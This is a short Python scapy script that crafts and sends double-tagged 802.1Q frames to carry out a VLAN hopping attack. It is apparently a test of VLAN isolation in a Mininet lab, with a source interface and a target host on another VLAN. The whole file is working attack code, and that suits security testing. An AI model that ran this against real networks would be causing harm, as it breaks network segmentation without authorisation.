from scapy.all import *
from scapy.layers.l2 import Ether, Dot1Q
from scapy.layers.inet import IP, UDP

def test_vlan_hopping(datapath_ip, src_mac, iface, outer_vlan, inner_vlan):
    """
    Sends crafted double-tagged VLAN packets to test the VLAN isolation.
    """
    # Create an Ethernet frame
    eth = Ether(src=src_mac, dst="00:00:00:00:20:02")

    # Add 802.1Q VLAN tags (outer and inner)
    dot1q_outer = Dot1Q(vlan=outer_vlan)  # Outer VLAN (VLAN 10)
    dot1q_inner = Dot1Q(vlan=inner_vlan)  # Inner VLAN (VLAN 20)

    # Add IP and UDP layers
    ip = IP(dst=datapath_ip, src="192.168.10.100")  # fake IP addresses
    udp = UDP(dport=80, sport=12345)

    # Craft the packet with outer and inner VLAN tags
    packet = eth / dot1q_outer / dot1q_inner / ip / udp

    print(f"[*] Sending double-tagged packet: Outer VLAN {outer_vlan}, Inner VLAN {inner_vlan}")
    sendp(packet, iface=iface, verbose=True)

if __name__ == "__main__":
    # Parameters from Mininet environment
    datapath_ip = "192.168.20.1"  # Target VLAN 20 host (h3)
    src_mac = "00:11:22:33:44:55"  # fake MAC address
    iface = "h1-eth0"  # Interface on h1 to send the attack from
    outer_vlan = 10
    inner_vlan = 20

    print("[*] Starting VLAN hopping attack...")
    test_vlan_hopping(datapath_ip, src_mac, iface, outer_vlan, inner_vlan)
    print("[*] Attack complete.")
